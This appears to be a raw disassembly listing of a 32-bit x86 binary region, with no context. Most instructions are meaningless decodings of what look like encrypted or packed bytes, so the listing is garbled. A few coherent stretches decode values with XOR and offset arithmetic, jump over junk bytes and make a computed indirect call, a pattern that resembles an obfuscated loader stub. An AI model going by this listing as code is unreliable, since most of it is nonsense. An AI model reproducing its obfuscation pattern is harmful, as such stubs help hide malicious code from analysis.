  415f59:	or     BYTE PTR [ebx-0x24],bh
  415f5c:	pop    ss
  415f5d:	scas   eax,DWORD PTR es:[edi]
  415f5e:	lods   eax,DWORD PTR ds:[esi]
  415f5f:	push   eax
  415f60:	stc    
  415f61:	xchg   BYTE PTR [ebx+0x46],bl
  415f64:	xchg   ecx,eax
  415f65:	jp     0x415fcd
  415f67:	sahf   
  415f68:	repnz imul esi,DWORD PTR ds:0x62b3c7e6,0x1464276e
  415f73:	pop    eax
  415f74:	jp     0x415fb6
  415f76:	daa    
  415f77:	mov    ds:0x14431920,al
  415f7c:	adc    bl,dh
  415f7e:	xchg   edx,eax
  415f7f:	(bad)  
  415f80:	imul   ecx,edx,0x50
  415f83:	cmp    DWORD PTR [ecx],edx
  415f85:	lock mov ecx,0x22f1e4ac
  415f8b:	stc    
  415f8c:	xchg   BYTE PTR [edi+eax*1],al
  415f8f:	in     al,dx
  415f90:	imul   ebx,DWORD PTR [edi],0xffffff81
  415f93:	sbb    al,0x7a
  415f95:	cmp    ebp,DWORD PTR [edi-0x20d11728]
  415f9b:	xchg   bl,al
  415f9d:	sahf   
  415f9e:	test   eax,0x7165096
  415fa3:	out    0xd8,al
  415fa5:	sub    BYTE PTR [esi+edi*4],bh
  415fa8:	sar    DWORD PTR [eax+ebx*1+0xb],0x72
  415fad:	mov    ds:0xf5c2076f,eax
  415fb2:	push   ss
  415fb3:	(bad)  
  415fb4:	aaa    
  415fb5:	aad    0xe8
  415fb7:	div    BYTE PTR [edi-0x4d9bfba9]
  415fbd:	xchg   esp,eax
  415fbe:	pushf  
  415fbf:	loope  0x41601f
  415fc1:	sar    BYTE PTR [edi],1
  415fc3:	jp     0x415fc5
  415fc5:	xor    esp,DWORD PTR [ecx]
  415fc7:	push   eax
  415fc8:	dec    ecx
  415fc9:	dec    edi
  415fca:	mov    ebx,0xca33635e
  415fcf:	xor    al,0x49
  415fd1:	cmp    DWORD PTR [esi+0x74],ebp
  415fd4:	mov    edx,0x6b81ffbd
  415fd9:	js     0x416011
  415fdb:	or     DWORD PTR [ebx+0x4c49cecd],ebp
  415fe1:	(bad)  
  415fe2:	mov    al,ds:0xc3eab1c1
  415fe7:	push   ss
  415fe8:	inc    dl
  415fea:	dec    edi
  415feb:	ret    
  415fec:	inc    eax
  415fed:	outs   dx,WORD PTR ds:[esi]
  415fef:	daa    
  415ff0:	imul   esi,esp,0xe98294f8
  415ff6:	push   cs
  415ff7:	dec    eax
  415ff8:	xor    ah,al
  415ffa:	sbb    BYTE PTR [ebx],bh
  415ffc:	mov    esi,0xf9ed6c45
  416001:	jmp    0xecb3:0x6a2b1584
  416008:	leave  
  416009:	out    0x3e,al
  41600b:	neg    DWORD PTR [ebp+0x19494aee]
  416011:	inc    ecx
  416012:	jo     0x416088
  416014:	jg     0x41604b
  416016:	adc    ebx,DWORD PTR [esi]
  416018:	clc    
  416019:	cwde   
  41601a:	outs   dx,BYTE PTR ds:[esi]
  41601b:	xchg   edx,eax
  41601c:	lahf   
  41601d:	jnp    0x415faf
  41601f:	mov    edx,0xa4a76bb6
  416024:	pop    ecx
  416025:	xchg   esi,eax
  416026:	outs   dx,DWORD PTR ds:[esi]
  416027:	cmp    esi,DWORD PTR [edi+0x2d]
  41602a:	sub    dl,dh
  41602c:	icebp  
  41602d:	test   DWORD PTR [ebx],edi
  41602f:	les    edx,FWORD PTR [esi+ecx*8]
  416032:	aas    
  416033:	test   eax,0xe677f10d
  416038:	out    0x15,eax
  41603a:	add    al,0x14
  41603c:	push   es
  41603d:	sbb    ch,BYTE PTR [edi-0x6b]
  416040:	pop    ds
  416041:	(bad)  
  416042:	adc    bh,BYTE PTR [ebx-0x6fd7b02]
  416048:	sub    BYTE PTR [ebp+0x57],0xc9
  41604c:	shl    ebx,1
  41604e:	fnsave [eax]
  416050:	push   ebx
  416051:	lea    ecx,[ebp-0x75]
  416054:	loopne 0x416004
  416056:	sub    eax,0xbb39238b
  41605b:	push   ds
  41605c:	or     BYTE PTR [ecx+0x6e],bh
  41605f:	cmp    BYTE PTR [ecx-0xb0a4e32],bl
  416065:	jnp    0x416010
  416067:	mov    edx,DWORD PTR [ebp+0x8]
  41606a:	xor    eax,ecx
  41606c:	lea    eax,[eax+edx*1+0x32729c]
  416073:	mov    DWORD PTR [ebp+0x8],eax
  416076:	mov    eax,DWORD PTR [ebp-0x18]
  416079:	mov    edx,DWORD PTR [ebp+0x14]
  41607c:	xor    eax,ecx
  41607e:	add    eax,esi
  416080:	imul   eax,DWORD PTR [edx]
  416083:	mov    edx,DWORD PTR [ebp-0x4]
  416086:	xor    edx,ecx
  416088:	jmp    0x41636c
  41608d:	adc    ecx,DWORD PTR [edx]
  41608f:	iret   
  416090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416091:	aad    0x61
  416093:	jae    0x41603f
  416095:	jl     0x4160ed
  416097:	cs jge 0x416098
  41609a:	(bad)  
  41609b:	ret    
  41609c:	mov    esi,0x707f17ca
  4160a1:	mov    ecx,0x5870707e
  4160a6:	xchg   ebx,eax
  4160a7:	int3   
  4160a8:	mov    ?,WORD PTR [ebx-0x34]
  4160ab:	aam    0x7e
  4160ad:	retf   
  4160ae:	xor    BYTE PTR [ebx+0x17a16ebe],dh
  4160b4:	push   eax
  4160b5:	test   al,0x34
  4160b7:	cmp    dl,BYTE PTR [eax]
  4160b9:	cdq    
  4160ba:	inc    ecx
  4160bb:	iret   
  4160bc:	je     0x41604c
  4160be:	scas   eax,DWORD PTR es:[edi]
  4160bf:	pop    edi
  4160c0:	cmp    dh,dl
  4160c2:	pop    ebp
  4160c3:	dec    edi
  4160c4:	(bad)  [eax-0x5fadbc96]
  4160ca:	outs   dx,BYTE PTR ds:[esi]
  4160cb:	jle    0x416117
  4160cd:	addr16 inc ecx
  4160cf:	inc    eax
  4160d0:	xor    al,0x8
  4160d2:	bound  edi,QWORD PTR [esi]
  4160d4:	inc    esi
  4160d5:	cmp    al,0xdd
  4160d7:	add    ah,BYTE PTR [ebp-0x273183ac]
  4160dd:	mov    es,WORD PTR [eax-0x1ec5f7a6]
  4160e3:	pop    esi
  4160e4:	fistp  WORD PTR [edx+0x2af16c78]
  4160ea:	js     0x4160fe
  4160ec:	iret   
  4160ed:	jecxz  0x4160a5
  4160ef:	xchg   BYTE PTR [edx],ch
  4160f1:	jp     0x4160cd
  4160f3:	jbe    0x4160e7
  4160f5:	or     esp,esp
  4160f7:	sub    ebp,esi
  4160f9:	setp   BYTE PTR [ecx+0xf]
  4160fd:	pop    ecx
  4160fe:	in     eax,dx
  4160ff:	pop    eax
  416100:	sub    cl,bh
  416102:	xchg   ecx,eax
  416103:	jns    0x41614c
  416105:	(bad)  
  416106:	fld    DWORD PTR [ebx+0x79d18e8]
  41610c:	loop   0x416136
  41610e:	inc    eax
  41610f:	mov    BYTE PTR [edi+0x44],ah
  416112:	mov    ss,WORD PTR [ebp-0x7e885a14]
  416118:	push   0xffffffec
  41611a:	pop    ebp
  41611b:	push   0xffffffba
  41611d:	and    al,0x30
  41611f:	sub    edx,DWORD PTR [edx-0x3]
  416122:	repz icebp 
  416124:	pushf  
  416125:	mov    ah,0xd1
  416127:	in     eax,0x1a
  416129:	in     al,0x1e
  41612b:	mov    ds:0x3c955ad9,eax
  416130:	jmp    0x416146
  416132:	mov    bl,0xa6
  416134:	fdiv   st(5),st
  416136:	cli    
  416137:	lock xlat BYTE PTR ds:[ebx]
  416139:	mov    ebp,0x3d3d0f30
  41613e:	mov    esi,DWORD PTR [ebx-0x1ea62e7c]
  416144:	inc    ebp
  416145:	(bad)  
  416146:	mov    ch,0x92
  416148:	arpl   WORD PTR [edx-0x47],sp
  41614b:	sbb    BYTE PTR [ebx+0x4d2f673d],ch
  416151:	(bad)  
  416152:	cmp    al,0xff
  416154:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416155:	lods   al,BYTE PTR ds:[esi]
  416156:	or     BYTE PTR [ebx-0x6c],cl
  416159:	test   al,0xab
  41615b:	push   esp
  41615c:	xor    eax,DWORD PTR ds:0x4b8b0760
  416162:	cdq    
  416163:	xchg   ecx,eax
  416164:	cdq    
  416165:	popf   
  416166:	or     BYTE PTR [edx+0x68f15e00],bl
  41616c:	or     bl,BYTE PTR [edi+ebx*8]
  41616f:	mov    ch,BYTE PTR [edx]
  416171:	add    DWORD PTR [ebx-0xa83918],0xa79db5ed
  41617b:	jg     0x4161c7
  41617d:	dec    esi
  41617e:	pop    es
  41617f:	nop
  416180:	sbb    DWORD PTR [esp+eax*2],eax
  416183:	pop    edx
  416184:	(bad)
  416188:	and    DWORD PTR [eax],esi
  41618a:	sub    esp,eax
  41618c:	push   ds
  41618d:	ds inc esi
  41618f:	or     bh,BYTE PTR [eax-0x32a79194]
  416195:	xor    edx,esp
  416197:	jp     0x416132
  416199:	add    esp,DWORD PTR [edi]
  41619b:	popa   
  41619c:	aad    0x40
  41619e:	lea    eax,[edi]
  4161a0:	jg     0x41616f
  4161a2:	aas    
  4161a3:	sti    
  4161a4:	xchg   edi,eax
  4161a5:	out    dx,eax
  4161a6:	adc    esi,esi
  4161a8:	imul   ebp,esp,0x43dab04d
  4161ae:	stc    
  4161af:	pop    ds
  4161b0:	int    0x9c
  4161b2:	(bad)  
  4161b4:	fsub   DWORD PTR [edx+esi*2+0x7e6acdb5]
  4161bb:	dec    eax
  4161bc:	icebp  
  4161bd:	or     al,0x28
  4161bf:	or     DWORD PTR [esi+0x66],edi
  4161c2:	jp     0x4161ca
  4161c4:	xchg   ebx,eax
  4161c5:	les    ecx,FWORD PTR [edi-0x3c]
  4161c8:	iret   
  4161c9:	ret    0x9686
  4161cc:	jmp    0x6de9f985
  4161d1:	cdq    
  4161d2:	sar    BYTE PTR [eax-0x4b],1
  4161d5:	loop   0x416190
  4161d7:	xchg   esi,eax
  4161d8:	ror    DWORD PTR [edi],0x32
  4161db:	sbb    al,0x77
  4161dd:	mov    ecx,0xc4829d83
  4161e2:	daa    
  4161e3:	dec    edi
  4161e4:	mov    eax,0x7531a69e
  4161e9:	xor    al,0xcb
  4161eb:	addr16 (bad) 
  4161ed:	push   ecx
  4161ee:	rol    esi,1
  4161f0:	lea    esi,[edx-0x656a7078]
  4161f6:	push   cs
  4161f7:	shl    DWORD PTR [ebp-0x66],0xef
  4161fb:	outs   dx,BYTE PTR ds:[esi]
  4161fc:	shl    BYTE PTR [eax],0xc9
  4161ff:	mov    ch,0x11
  416201:	sbb    DWORD PTR [eax],edi
  416203:	cmp    DWORD PTR [eax],edi
  416205:	ds push 0xffffffdf
  416208:	mov    ds:0x12cca627,eax
  41620d:	adc    ebp,DWORD PTR [ebx]
  41620f:	outs   dx,DWORD PTR ds:[esi]
  416210:	rcr    BYTE PTR [ebp+0x7c23bfac],1
  416216:	mov    ah,0x65
  416218:	sti    
  416219:	adc    bh,BYTE PTR [esi-0x58458669]
  41621f:	jp     0x4161f4
  416221:	bound  ebx,QWORD PTR [eax+0x1c]
  416224:	and    BYTE PTR [eax],cl
  416226:	into   
  416227:	add    al,0xc9
  416229:	xor    al,BYTE PTR [ebx+0x4d]
  41622c:	mov    al,0x28
  41622e:	jle    0x4161b6
  416230:	stos   BYTE PTR es:[edi],al
  416231:	data16 mov WORD PTR [edx],gs
  416234:	push   es
  416235:	and    eax,edi
  416237:	xlat   BYTE PTR ds:[ebx]
  416238:	aaa    
  416239:	xchg   ebx,eax
  41623a:	imul   ecx,DWORD PTR [esi+0x62],0xffffffac
  41623e:	outs   dx,DWORD PTR ds:[esi]
  41623f:	les    ebp,FWORD PTR ds:0xeb1d909c
  416245:	mov    ecx,0x94846e00
  41624a:	ret    0xe4b2
  41624d:	loopne 0x41629b
  41624f:	fnsave [edi+0x78]
  416252:	pop    ss
  416253:	mov    esi,0x869f9e7e
  416258:	rcl    DWORD PTR [esi+0x11],1
  41625b:	sub    ecx,ecx
  41625d:	inc    esi
  41625e:	in     eax,0x38
  416260:	stc    
  416261:	pusha  
  416262:	inc    ebx
  416263:	mov    al,0x8b
  416265:	ret    
  416266:	xchg   edx,eax
  416267:	rol    DWORD PTR [esi+0x62],cl
  41626a:	mov    bl,0x72
  41626c:	ret    0xe28c
  41626f:	stos   DWORD PTR es:[edi],eax
  416270:	dec    esp
  416271:	stc    
  416272:	mov    ebp,0xa09007d8
  416277:	loop   0x416267
  416279:	dec    esp
  41627a:	xchg   edx,eax
  41627b:	xchg   ebx,eax
  41627c:	push   ebp
  41627d:	sub    al,0x31
  41627f:	jnp    0x416239
  416281:	daa    
  416282:	cld    
  416283:	sbb    al,0x5b
  416285:	jmp    0x4162ac
  416287:	jmp    0x7408:0x88222658
  41628e:	mov    eax,0xed5bc7ff
  416293:	mov    esi,0x778d4678
  416298:	mov    esp,0xda5cfdea
  41629d:	mov    ebx,0xcca2139f
  4162a2:	inc    ecx
  4162a3:	push   ss
  4162a4:	daa    
  4162a5:	adc    dh,BYTE PTR [edx-0x185d83c2]
  4162ab:	jbe    0x416283
  4162ad:	imul   edx,DWORD PTR [eax-0x29574e05],0xffffffd0
  4162b4:	jl     0x416292
  4162b6:	sub    edx,esp
  4162b8:	pop    es
  4162b9:	sahf   
  4162ba:	cdq    
  4162bb:	adc    DWORD PTR [edx+0x637c2f48],edx
  4162c1:	lock and dl,dl
  4162c4:	xor    al,0xea
  4162c6:	mov    ecx,0xe01d934c
  4162cb:	pop    ebx
  4162cc:	inc    esi
  4162cd:	lods   eax,DWORD PTR ds:[esi]
  4162ce:	dec    ebx
  4162cf:	pop    esp
  4162d0:	loop   0x4162cb
  4162d2:	scas   eax,DWORD PTR es:[edi]
  4162d3:	add    eax,DWORD PTR [edx+0x32]
  4162d6:	(bad)  
  4162d8:	and    eax,0x66f983ce
  4162dd:	ds icebp 
  4162df:	xor    eax,0x641f53a1
  4162e4:	and    BYTE PTR ds:0xbe847b9e,al
  4162ea:	inc    ebp
  4162eb:	push   esp
  4162ec:	out    0xd1,al
  4162ee:	arpl   cx,cx
  4162f0:	fistp  QWORD PTR [ecx+0x4e339242]
  4162f6:	and    cl,BYTE PTR [edi-0x78ad5d60]
  4162fc:	sbb    BYTE PTR [esi-0x2],0xfc
  416300:	push   ebp
  416301:	sbb    al,0x62
  416303:	hlt    
  416304:	xor    al,cl
  416306:	not    dl
  416308:	mov    DWORD PTR [ecx],ebx
  41630a:	sahf   
  41630b:	repnz out 0x32,al
  41630e:	push   ecx
  41630f:	mov    DWORD PTR [ebx+eiz*1],edi
  416312:	sahf   
  416313:	pop    ebx
  416314:	pop    ss
  416315:	das    
  416316:	imul   ebp,edx,0x8138beb0
  41631c:	loope  0x41634f
  41631e:	mov    ch,0xe6
  416320:	dec    esp
  416321:	mov    bl,0x18
  416323:	mov    cl,0x6a
  416325:	xor    ebp,ebp
  416327:	dec    esi
  416328:	pop    esi
  416329:	dec    ebx
  41632a:	xor    bh,BYTE PTR cs:[edi]
  41632d:	test   al,0xc5
  41632f:	mov    ah,0x2d
  416331:	or     eax,0xde1a8541
  416336:	lods   eax,DWORD PTR ds:[esi]
  416337:	jmp    0x4162cf
  416339:	ss fwait
  41633b:	push   cs
  41633c:	push   ds
  41633d:	mov    esi,ecx
  41633f:	(bad)  
  416341:	mov    ebp,0x28fadc9e
  416346:	add    al,BYTE PTR [ecx+0xc]
  416349:	mov    edi,0x11c68dc4
  41634e:	adc    dh,BYTE PTR [ecx]
  416350:	pop    esp
  416351:	aas    
  416352:	and    BYTE PTR [ebx],dl
  416354:	pop    ebx
  416355:	push   ss
  416356:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416358:	or     BYTE PTR [ebp+0x50],cl
  41635b:	loopne 0x416306
  41635d:	push   edx
  41635f:	test   BYTE PTR [ebx+0x1c26b53c],bl
  416365:	inc    esp
  416366:	add    cl,BYTE PTR [esp+ebp*8+0x6f]
  41636a:	jbe    0x4162ef
  41636c:	mov    ecx,DWORD PTR [ebp+0x8]
  41636f:	lea    ecx,[edx+ecx*1+0x32729c]
  416376:	cmp    ecx,eax
  416378:	jne    0x4154a0
  41637e:	mov    ebx,esi
  416380:	jmp    0x41638a
  416385:	mov    ebx,0x32729c
  41638a:	mov    eax,DWORD PTR [ebp-0x4]
  41638d:	xor    eax,0x7510855
  416392:	add    eax,ebx
  416394:	mov    DWORD PTR [ebp-0xc],eax
  416397:	xor    ebx,ebx
  416399:	lea    eax,[ebp-0x10]
  41639c:	add    ebx,DWORD PTR [eax]
  41639e:	call   ebx
  4163a0:	xor    ebx,ebx
  4163a2:	inc    ebx
  4163a3:	cmp    DWORD PTR [ebp+0x10],ebx
  4163a6:	je     0x416f54
  4163ac:	jmp    0x416690
  4163b1:	or     al,0x9a
  4163b3:	shl    DWORD PTR [esi],1
  4163b5:	jno    0x41642c
  4163b7:	jmp    0x41636b
  4163b9:	lds    ecx,FWORD PTR ds:0xb8b4c841
  4163bf:	mov    esp,eax
  4163c1:	adc    edx,DWORD PTR [edi+edi*2]
  4163c4:	jo     0x41637f
  4163c6:	jle    0x416438
  4163c8:	jo     0x416383
  4163ca:	lods   al,BYTE PTR ds:[esi]
  4163cb:	aaa    
  4163cc:	imul   ebp,esi,0x6f
  4163cf:	loop   0x4163d6
  4163d1:	cmp    dh,BYTE PTR [ecx+0x18]
  4163d4:	out    0x36,eax
  4163d6:	frstor [ebp+0x128dd1a6]
  4163dc:	pop    es
  4163dd:	test   al,dh
  4163df:	pop    ds
  4163e0:	push   eax
  4163e1:	jae    0x416414
  4163e3:	inc    eax
  4163e4:	in     al,0xb2
  4163e6:	pop    ss
  4163e7:	xchg   BYTE PTR [edx+0x4bb6cc9f],cl
  4163ed:	call   0xfd8d:0xd51d0fb8
  4163f4:	int    0x47
  4163f6:	or     BYTE PTR [ebx-0x72],bh
  4163f9:	push   es
  4163fa:	pop    ebp
  4163fb:	(bad)  
  4163fc:	in     eax,0x92
  4163fe:	mov    ds,WORD PTR [edi]
  416400:	inc    edx
  416401:	pushf  
  416402:	and    eax,0xbb24ed5d
  416407:	mul    ch
  416409:	mov    dh,0xf9
  41640b:	sub    esp,DWORD PTR [esi]
  41640d:	push   0xffffff9c
  41640f:	cmp    BYTE PTR [edx-0x7],ah
  416412:	adc    al,BYTE PTR ds:0x67efdd78
  416418:	in     al,0xc3
  41641a:	popf   
  41641b:	inc    esp
  41641c:	mov    eax,0xdb3136bd
  416421:	cmp    eax,0x6c7cdb5d
  416426:	cld    
  416427:	ror    DWORD PTR [ebp+ecx*8+0x66],1
  41642b:	jb     0x41643c
  41642d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41642e:	int    0xe0
  416430:	in     al,0x68
  416432:	aaa    
  416433:	jno    0x416458
  416435:	cmp    esi,DWORD PTR [ebp-0x47738220]
  41643b:	popa   
  41643c:	ja     0x416460
  41643e:	and    BYTE PTR [edx+edx*2+0x3a],0xd4
  416443:	xchg   esp,eax
  416444:	add    al,0x17
  416446:	xchg   BYTE PTR ss:[bp+0x79],ch
  41644b:	(bad)  
  41644c:	cld    
  41644d:	int3   
  41644e:	adc    DWORD PTR [ecx-0xf0891fd],0xfffffff8
  416455:	xor    esi,ebp
  416457:	mov    ch,0x1c
  416459:	loop   0x41640a
  41645b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41645c:	loopne 0x416442
  41645e:	cmp    BYTE PTR [edx],0x18
  416461:	ja     0x41649f
  416463:	dec    ebp
  416464:	adc    al,BYTE PTR [esp+ebx*1-0x21]
  416468:	adc    BYTE PTR [eax+0x34],ah
  41646b:	fdivr  st,st(6)
  41646d:	lds    esp,FWORD PTR [edx-0x4b]
  416470:	test   BYTE PTR [edi],0x65
  416473:	adc    DWORD PTR [ebp-0x67f1c49a],ebp
  416479:	cmp    al,0x2f
  41647b:	addr16 mov al,0xd9
  41647e:	cmp    DWORD PTR [edi-0x209b9b83],0x1a
  416485:	jb     0x4164ed
  416487:	pop    ecx
  416488:	mov    bl,BYTE PTR [ebx-0x112c9181]
  41648e:	jns    0x4164c6
  416490:	retf   
  416491:	out    dx,eax
  416492:	cli    
  416493:	xchg   esi,eax
  416494:	mov    esi,0x13ba8070
  416499:	test   ebx,ebx
  41649b:	xchg   ecx,eax
  41649c:	adc    BYTE PTR [esi+0x5366d0ed],bh
  4164a2:	lods   eax,DWORD PTR ds:[esi]
  4164a3:	sbb    edi,DWORD PTR [eax]
  4164a5:	hlt    
  4164a6:	pop    edx
  4164a7:	repz xor al,dh
  4164aa:	pop    ebp
  4164ab:	shr    edi,0x2b
  4164ae:	test   eax,0x59c01781
  4164b3:	lods   eax,DWORD PTR ds:[esi]
  4164b4:	push   DWORD PTR [edi]
  4164b6:	ins    DWORD PTR es:[edi],dx
  4164b7:	xchg   ecx,eax
  4164b8:	lods   eax,DWORD PTR ds:[esi]
  4164b9:	push   ecx
  4164ba:	in     al,dx
  4164bb:	into   
  4164bc:	shl    DWORD PTR [esi-0x2de578f2],0xe6
  4164c3:	lock or eax,DWORD PTR [eax-0x3a]
  4164c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164c8:	mov    ds,ebx
  4164ca:	xchg   edx,eax
  4164cb:	es test eax,0xd0a1e2c
  4164d1:	leave  
  4164d2:	push   ss
  4164d3:	and    DWORD PTR [esi+0x7c51e77c],0x42
  4164da:	jmp    FWORD PTR [esi+0x4b]
  4164dd:	xchg   edi,eax
  4164de:	and    cl,BYTE PTR [esi]
  4164e0:	callw  0xb1af
  4164e4:	jp     0x416531
  4164e6:	jge    0x4164da
  4164e8:	int    0x18
  4164ea:	dec    edi
  4164eb:	pop    ds
  4164ec:	(bad)  
  4164ed:	aam    0xe2
  4164ef:	jl     0x41655d
  4164f1:	mov    ecx,0xd5f755ec
  4164f6:	mov    esi,0xbb4d4c28
  4164fb:	xchg   edi,eax
  4164fc:	dec    esp
  4164fd:	xchg   ebp,eax
  4164fe:	xor    BYTE PTR [eax+0x4a8a402a],ch
  416504:	xor    bh,BYTE PTR [ebx+eiz*8-0x43]
  416508:	xchg   edi,eax
  416509:	aaa    
  41650a:	aad    0xc8
  41650c:	(bad)  
  41650d:	test   eax,0x9b6dcb35
  416512:	inc    edx
  416513:	pop    ds
  416514:	outs   dx,BYTE PTR ds:[esi]
  416515:	and    ebp,DWORD PTR ds:0x8e809c24
  41651b:	mov    ecx,0x6005b150
  416520:	cmp    DWORD PTR [edi],esp
  416522:	nop
  416523:	pop    ds
  416524:	mov    al,0x1c
  416526:	pushw  cs
  416528:	cmp    ch,BYTE PTR [eax]
  41652a:	inc    ecx
  41652b:	ss jmp 0x60371fc0
  416531:	xchg   BYTE PTR fs:[edx+0x115792b9],al
  416538:	in     eax,0x68
  41653a:	or     esi,DWORD PTR ds:[ecx-0x7f]
  41653e:	pop    edx
  41653f:	sub    BYTE PTR [ecx+0x42515f0e],dl
  416545:	mov    dh,0xb5
  416547:	adc    dh,BYTE PTR [ebp-0xb]
  41654a:	xchg   ecx,eax
  41654b:	into   
  41654c:	jmp    0x4165c5
  41654e:	cmp    DWORD PTR [edi+0x3a196640],ecx
  416554:	mov    cl,0xaf
  416556:	dec    esp
  416557:	out    dx,al
  416558:	aas    
  416559:	and    DWORD PTR [edx-0x54],eax
  41655c:	sbb    DWORD PTR [ebx],ecx
  41655e:	outs   dx,DWORD PTR ds:[esi]
  41655f:	fsubr  QWORD PTR [ecx]
  416561:	sbb    BYTE PTR [ebp+0x4a3af58e],bh
  416567:	mov    esp,0xd66919e1
  41656c:	mov    cl,0xfb
  41656e:	xor    DWORD PTR [edx-0x272603b8],ebp
  416574:	or     al,0xa
  416576:	pop    ebp
  416577:	cmp    esi,DWORD PTR [eax+ebx*4-0x6b]
  41657b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41657c:	adc    DWORD PTR [eax-0x3df637ca],0x52
  416583:	pop    ebp
  416584:	repz add bl,BYTE PTR [eax+0x91afdf6]
  41658b:	xchg   esi,eax
  41658c:	leave  
  41658d:	xor    eax,0xc5700407
  416592:	sar    DWORD PTR [edi-0xfd41072],0xca
  416599:	das    
  41659a:	fwait
  41659b:	pushf  
  41659c:	fstp   QWORD PTR [ecx+edx*4]
  41659f:	ins    BYTE PTR es:[edi],dx
  4165a0:	repnz mov al,0x5a
  4165a3:	xchg   esp,eax
  4165a4:	inc    esp
  4165a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4165a6:	fidivr WORD PTR [esi+0x42]
  4165a9:	add    ebp,DWORD PTR [ebp+0x63]
  4165ac:	and    dh,BYTE PTR [ebx+0x5c1337a2]
  4165b2:	cmp    esp,DWORD PTR [ebp-0x4]
  4165b5:	retf   0x4033
  4165b8:	fsubr  st(5),st
  4165ba:	scas   al,BYTE PTR es:[edi]
  4165bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165bc:	sub    esi,DWORD PTR [ebx+0x24]
  4165bf:	cdq    
  4165c0:	(bad)  
  4165c1:	popf   
  4165c2:	pop    eax
  4165c3:	fisub  WORD PTR [ebp+0x4f68b562]
  4165c9:	fdivr  QWORD PTR [esi]
  4165cb:	mov    cs:0xe51182b4,eax
  4165d1:	arpl   WORD PTR [edx+0x1c2a4fba],sp
  4165d7:	mov    al,0xed
  4165d9:	mov    fs,WORD PTR [esi-0x7e]
  4165dc:	inc    edx
  4165dd:	and    bl,dh
  4165df:	push   ebp
  4165e0:	stc    
  4165e1:	test   BYTE PTR [eax],dl
  4165e3:	in     al,0x4
  4165e5:	loop   0x416573
  4165e7:	xor    al,0x50
  4165e9:	out    0x9a,eax
  4165eb:	xor    eax,0xbcb2d094
  4165f0:	test   DWORD PTR [ecx+0x57f36b41],ecx
  4165f6:	fstp   QWORD PTR [ecx+ecx*2+0x143e6eee]
  4165fd:	mov    bl,0xcc
  4165ff:	int    0x36
  416601:	setno  al
  416604:	and    BYTE PTR [ebx],dl
  416606:	dec    esi
  416607:	xchg   ebx,eax
  416608:	dec    ebp
  416609:	mov    edx,0x24f7f377
  41660e:	mov    dl,0x9b
  416610:	inc    ecx
  416611:	jmp    0x416675
  416613:	fstp   DWORD PTR [ebx+0x78]
  416616:	dec    esp
  416617:	xchg   ebp,eax
  416618:	jb     0x4165f0
  41661a:	fsub   QWORD PTR [ebp+0x2b]
  41661d:	pop    ds
  41661e:	pop    ebp
  41661f:	inc    edx
  416620:	cmc    
  416621:	enter  0xcf06,0xc0
  416625:	adc    eax,0x5f9aa734
  41662a:	jmp    0x6e84:0xa5f7db33
  416631:	push   esp
  416632:	test   cl,ch
  416634:	jmp    0x3b1a:0x5ed02c34
  41663b:	sar    DWORD PTR [esi*2+0x29ebfee9],cl
  416642:	les    esi,FWORD PTR [edx+0x66e5528c]
  416648:	pushf  
  416649:	ins    DWORD PTR es:[edi],dx
  41664a:	cld    
  41664b:	pusha  
  41664c:	adc    al,0x36
  41664e:	je     0x416617
  416650:	loop   0x4166bb
  416652:	pop    ecx
  416653:	mov    eax,0x155b05cc
  416658:	int    0xf5
  41665a:	and    DWORD PTR [ecx],edi
  41665c:	xchg   esp,eax
  41665d:	push   0x433858bb
  416662:	fsubr  DWORD PTR [eax]
  416664:	cdq    
  416665:	or     eax,0xd34d6e69
  41666a:	jecxz  0x4166e2
  41666c:	pop    eax
  41666d:	and    eax,0x3c49f044
  416672:	aad    0x8f
  416674:	ins    DWORD PTR es:[edi],dx
  416675:	enter  0xc379,0x3c
  416679:	push   esi
  41667a:	adc    BYTE PTR [ebp-0x7d],bl
  41667d:	jle    0x416665
  41667f:	push   cs
  416680:	push   0x76d1fec7
  416685:	xor    ebx,esi
  416687:	xchg   DWORD PTR [edx-0x313fbfa1],ecx
  41668d:	ja     0x416654
  41668f:	ss xchg edx,eax
  416691:	push   0xa
  416693:	pop    ecx
  416694:	push   0x4
  416696:	pop    ebx
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416717
  4166ae:	int    0xed
  4166b0:	arpl   WORD PTR [edx+edx*1+0x7f],bx
  4166b4:	jo     0x41666f
  4166b6:	jle    0x416728
  4166b8:	jo     0x416650
  4166ba:	mov    eax,0x3b10a598
  4166bf:	cmp    al,0xf0
  4166c1:	pushf  
  4166c2:	aas    
  4166c3:	mul    esp
  4166c5:	aas    
  4166c6:	dec    edx
  4166c7:	add    eax,0xe87fbb5a
  4166cc:	pop    eax
  4166cd:	lock cdq 
  4166cf:	dec    esp
  4166d0:	adc    BYTE PTR [esi],0xc4
  4166d3:	jo     0x4166c5
  4166d5:	das    
  4166d6:	mov    al,0xc1
  4166d8:	cmp    ebp,DWORD PTR [eax]
  4166da:	and    bh,BYTE PTR [esi+0x6b]
  4166dd:	and    ebp,DWORD PTR [ebp-0x41]
  4166e0:	dec    esp
  4166e1:	pop    edx
  4166e2:	inc    esi
  4166e3:	daa    
  4166e4:	sub    al,0x19
  4166e6:	mov    esi,0xf3e1b4dc
  4166eb:	dec    ecx
  4166ec:	cmp    eax,0xaa215488
  4166f1:	sbb    eax,edi
  4166f3:	or     al,dh
  4166f5:	imul   edx,DWORD PTR [esi],0x8e6e2cdd
  4166fb:	cmp    al,0x9c
  4166fd:	cmp    eax,0xb664d201
  416702:	push   edi
  416703:	ret    
  416704:	or     eax,0x835cc664
  416709:	fimul  WORD PTR [ecx+edx*1+0x5b4feae5]
  416710:	jae    0x416770
  416712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416713:	fwait
  416714:	dec    ebx
  416715:	in     eax,dx
  416716:	jo     0x41673b
